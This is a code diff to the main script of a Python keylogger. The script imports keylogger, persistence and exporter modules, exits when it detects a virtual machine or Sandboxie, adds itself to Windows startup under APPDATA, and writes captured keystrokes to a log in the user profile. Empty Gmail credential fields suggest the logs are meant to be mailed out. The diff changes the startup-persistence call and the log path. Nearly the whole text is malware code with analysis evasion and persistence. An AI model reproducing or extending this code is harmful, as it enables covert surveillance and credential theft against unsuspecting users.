@@ -2,9 +2,12 @@ import sys, os, time
 
 sys.path.append(os.pardir)
 
-from src import persistence
+from src import persistence, Tools
 from src import exporter
 from src.keylogger import keylogger
+
+PATH = os.path.realpath(sys.argv[0])
+APPDATA = os.environ["APPDATA"]
 
 
 class main:
@@ -12,13 +15,13 @@ class main:
         if persistence.instance_running(): sys.exit(0)
         if check_vm and persistence.detect_vm(): sys.exit(0)
         if check_sandboxie and persistence.detect_sandboxie(): sys.exit(0)
-        if add_to_startup: persistence.add_to_startup()
+        if add_to_startup: persistence.add_to_startup(APPDATA, PATH)
 
         self.gmail = ""
         self.gmail_pass = ""
 
         self.timer = timer
-        self.export_path = export_path
+        self.export_path = Tools.get_env_var(export_path)
 
         self.current_file_path = os.path.realpath(sys.argv[0])
 
@@ -47,4 +50,4 @@ class main:
                         self.keylogger.clear_key_log()
 
 
-if __name__ == "__main__": main = main(60, "C:/temp/log.txt", False, False, False, False);main.start()
+if __name__ == "__main__": main = main(60, "%userprofile%\log.txt", False, False, False, False);main.start()
